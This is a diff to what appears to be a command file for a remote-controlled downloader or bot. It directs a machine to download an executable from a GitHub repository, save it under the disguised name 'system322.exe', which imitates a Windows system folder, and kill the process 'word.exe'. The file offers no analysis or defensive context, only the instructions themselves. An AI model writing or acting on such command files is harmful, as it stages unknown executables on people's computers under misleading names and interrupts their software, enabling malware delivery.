@@ -1,2 +1,2 @@
-DOWNLOAD:https://github.com/cybershadow255/tresor/raw/refs/heads/main/Test.exe;system322
+DOWNLOAD:https://github.com/cybershadow255/tresor/raw/refs/heads/main/Test.exe;system322.exe
 KILL:word.exe
